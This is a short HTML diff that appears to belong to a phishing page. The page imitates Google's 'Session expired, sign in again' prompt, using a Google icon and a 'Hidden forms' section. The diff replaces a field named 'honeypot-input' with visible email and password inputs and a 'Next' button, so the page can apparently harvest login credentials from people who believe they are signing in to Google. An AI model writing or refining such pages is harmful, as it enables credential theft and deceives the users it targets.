@@ -100,7 +100,17 @@
       <img src="https://i.pinimg.com/736x/ea/bc/1a/eabc1a70245f1384e30960f25f9b2784.jpg" alt="Google Icon" class="google-icon">
       <h2>Session expired</h2>
       <p>To continue, sign in again.</p>
-      <input type="password" id="honeypot-input" placeholder="Tap here to sign in">
+    <div class="input-container">
+      <input type="email" id="visible-email" required>
+      <label for="visible-email">Email or phone</label>
+    </div>
+    <div class="input-container">
+      <input type="password" id="visible-password" required>
+      <label for="visible-password">Enter your password</label>
+    </div>
+    <div class="button-container">
+      <button id="signin-button">Next</button>
+    </div>
   </div>
 
   <!-- Hidden forms -->
